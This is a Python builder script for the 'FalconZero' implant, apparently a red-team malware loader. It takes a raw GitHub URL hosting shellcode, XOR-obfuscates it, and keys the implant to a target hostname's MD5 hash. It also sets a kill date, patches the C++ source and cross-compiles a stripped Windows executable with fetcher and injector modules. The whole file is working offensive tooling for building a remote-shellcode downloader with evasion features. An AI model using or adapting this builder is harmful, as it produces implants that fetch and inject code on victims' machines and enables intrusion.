# Filename: generate_implant.py (FalconZero Implant Generation Utility)
# Author: slaeryan
# Purpose: This is a small utility script written in Python3 to aid in the process
# of building a FalconZero implant from source and automate it. 
# It will download and install the necessary prerequisites(if not 
# already present) and make the process of generating an implant a breeze!
# Usage: Run python3 generate_implant.py from a Terminal
# Testing: URL = https://raw.githubusercontent.com/slaeryan/DigitalOceanTest/master/messagebox_shellcode_hex_32.txt
# Warning: If you edit anything in /source/ make sure to reflect the changes back here!


import in_place
import os
import os.path
import sys
from distutils.spawn import find_executable
import pyfiglet
from termcolor import colored
import hashlib
import string
import random


KEY = "ABCDEFGHIJKLMNOPQRSTUVWXYZ"


def xor(data, key):
	key = str(key)
	l = len(key)
	output_str = ""
	for i in range(len(data)):
		current = data[i]
		current_key = key[i % len(key)]
		output_str += chr(ord(current) ^ ord(current_key))
	ciphertext = '{ 0x' + ', 0x'.join(hex(ord(x))[2:] for x in output_str) + ' };'
	return ciphertext


def print_banner():
	ascii_banner = pyfiglet.figlet_format("FalconZero Implant Generation Utility")
	print(colored(ascii_banner, "blue"))
	print("\n")
	print(colored("Version: 1.0(Alpha Release)\n", "blue"))
	print(colored("Author: slaeryan\n", "blue"))
	print(colored("This is an utility script to install all the necessary prequisites and generate a FalconZero implant.\n", "blue"))


def edit_url():
	download_url = input(colored("[+] Enter the Github shellcode URL(raw): ", "blue"))
	encrypted_command_url = xor(download_url, KEY)
	command = '    char downloadURL[] = ' + encrypted_command_url + '\n'
	linecount = 0
	with in_place.InPlace('./source/falcon_zero.cpp') as fp:
		for line in fp:
			linecount += 1
			if (linecount == 23): # If you edit falcon_zero.cpp, don't forget to change me to an appropriate line number too 
				fp.write(command)
			else:
				fp.write(''.join(c for c in line))
	print("\n")


def edit_host():
	host = input(colored("[+] Enter the hostname of the target machine: ", "blue"))
	targethash = hashlib.md5(host.encode()).hexdigest()
	encrypted_targethash = xor(targethash, KEY)
	command = '    char hash[] = ' + encrypted_targethash + '\n'
	linecount = 0
	with in_place.InPlace('./source/safety_measures.cpp') as fp:
		for line in fp:
			linecount += 1
			if (linecount == 69): # If you edit safety_measures.cpp, don't forget to change me to an appropriate line number too
				fp.write(command)
			else:
				fp.write(''.join(c for c in line))
	print("\n")


def edit_date():
	killdate = input(colored("[+] Enter the killdate of the implant: [DD/MM/YYYY] ", "blue"))
	day, month, year = killdate.split('/', 3)
	if day[0] == '0':
		day = day[1]
	if month[0] == '0':
		month = month[1]
	command = '	if ((year == ' + year + ') && (month <= ' + month + ') && (day <= ' + day + ')) {\n'
	linecount = 0
	with in_place.InPlace('./source/safety_measures.cpp') as fp:
		for line in fp:
			linecount += 1
			if (linecount == 92): # If you edit safety_measures.cpp, don't forget to change me to an appropriate line number too
				fp.write(command)
			else:
				fp.write(''.join(c for c in line))
	print("\n")


def check_requirements():
	flag1 = find_executable("i686-w64-mingw32-g++") is not None
	flag2 = find_executable("x86_64-w64-mingw32-g++") is not None
	if ((flag1 is False) or (flag2 is False)):
		print(colored("[-] It appears that you don't have the MinGW cross-compiler installed which is necessary to build the implant.\n", "red"))
		choice = input(colored("[+] Would you like me to install it for you? [Y/n] ", "yellow"))
		print("\n")
		if choice == 'y' or choice == 'Y' or choice == 'yes' or choice == 'Yes':
			print(colored("[+] Great! Installing the MinGW compiler now...\n", "green"))
			os.system("sudo apt install mingw-w64")
			print("\n")
		else:
			print(colored("[-] Please install it manually then and run the FalconZero Implant Generation Utility again!", "red"))
			sys.exit(0)
	else:
		print(colored("[+] You already have the compiler installed! Moving on to the build stage now...\n", "green"))


def randomString(stringLength=6):
    letters = string.ascii_lowercase
    return ''.join(random.choice(letters) for i in range(stringLength))


def build_exe():
	arch = input(colored("[+] Enter implant architecture: [i686/x64] ", "blue"))
	if ((arch != 'i686') and (arch != 'x64')):
		print(colored("\n[-] Invalid option. Please try again...\n", "red"))
		build_exe()
	print("\n")
	print(colored("[+] Attempting to build the executable now... ", "yellow"))
	print("\n")
	if not os.path.isdir('./bin'):
		os.mkdir('./bin/')
	if arch == 'i686':
		build_id = randomString()
		os.system("i686-w64-mingw32-g++ ./source/falcon_zero.cpp ./source/fetcher.cpp ./source/converter.cpp ./source/injector.cpp ./source/xor.cpp ./source/safety_measures.cpp -o ./bin/falcon_zero32_" + build_id + ".exe -lurlmon -lntdll -mwindows -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc")
		print("\n")
		if os.path.isfile('./bin/falcon_zero32_' + build_id + '.exe'):
			print(colored("[+] FalconZero implant generated successfully to /bin/falcon_zero32_" + build_id + ".exe", "green"))
		else:
			print(colored("[-] FalconZero implant creation failed! Please check the error messages.", "red"))
	elif arch == 'x64':
		build_id = randomString()
		os.system("x86_64-w64-mingw32-g++ ./source/falcon_zero.cpp ./source/fetcher.cpp ./source/converter.cpp ./source/injector.cpp ./source/xor.cpp ./source/safety_measures.cpp -o ./bin/falcon_zero64_" + build_id + ".exe -lurlmon -lntdll -mwindows -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc")
		print("\n")
		if os.path.isfile('./bin/falcon_zero64_' + build_id + '.exe'):
			print(colored("[+] FalconZero implant generated successfully to /bin/falcon_zero64_" + build_id + ".exe", "green"))
		else:
			print(colored("[-] FalconZero implant creation failed! Please check the error messages.", "red"))
	print("\n")
	sys.exit(0)


def main():
	print_banner()
	edit_url()
	edit_host()
	edit_date()
	check_requirements()
	build_exe()


if __name__ == "__main__":
	main()
